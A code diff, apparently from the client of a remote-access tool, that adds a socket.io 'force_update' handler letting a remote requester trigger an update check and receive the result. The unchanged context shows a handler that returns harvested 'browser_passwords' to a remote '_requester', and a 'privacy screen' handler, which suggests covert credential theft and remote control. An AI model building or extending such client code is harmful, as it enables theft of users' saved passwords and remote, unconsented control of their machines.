@@ -987,6 +987,22 @@ def _make_client():
         except Exception as e:
             sio.emit("browser_passwords_result", {"passwords": [], "error": str(e), "_requester": data.get("_requester") if data else None})
 
+    # ── Force update ─────────────────────────────────────────────────────────
+    @sio.on("force_update")
+    def _on_force_update(data):
+        try:
+            import updater, app as _app
+            updater.check_once(build_tag=getattr(_app, "_BUILD_TAG", ""), log=_log)
+            sio.emit("force_update_result", {
+                "ok": True, "message": "Update check triggered",
+                "_requester": (data or {}).get("_requester"),
+            })
+        except Exception as e:
+            sio.emit("force_update_result", {
+                "ok": False, "error": str(e),
+                "_requester": (data or {}).get("_requester"),
+            })
+
     # ── Privacy Screen ────────────────────────────────────────────────────────
     @sio.on("privacy_start")
     def _on_privacy_start(data):
